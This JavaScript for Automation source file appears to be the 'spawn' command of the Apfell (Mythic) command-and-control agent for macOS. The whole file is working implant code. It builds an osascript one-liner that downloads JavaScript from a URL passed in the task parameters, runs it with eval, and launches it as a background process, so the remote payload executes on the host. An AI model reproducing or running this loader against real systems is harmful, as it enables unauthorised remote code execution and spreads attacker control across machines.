exports.spawn = function(task, command, params){
    try{
        let config = JSON.parse(params);
        if(config['method'] == "shell_api"){
            if(config['type'] == "oneliner"){
                if(config['payload-type'] == "apfell-jxa"){
                    //full_url = C2.baseurl + "api/v1.0/payloads/get/" + split_params[3];
                    let full_url = config['url'];
                    let path = "/usr/bin/osascript";
                    let args = ['-l','JavaScript','-e'];
                    let command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
                    command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));";
                    args.push(command);
                    args.push("&");
                    try{
                        let pipe = $.NSPipe.pipe;
                        let file = pipe.fileHandleForReading;  // NSFileHandle
                        let task = $.NSTask.alloc.init;
                        task.launchPath = path;
                        task.arguments = args;
                        task.standardOutput = pipe;
                        task.standardError = pipe;
                        task.launch;
                    }
                    catch(error){
                        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
                    }
                    return JSON.stringify({"user_output":"Process spawned", "completed": true});
                }
            }
        }
    }catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
};
COMMAND_ENDS_HERE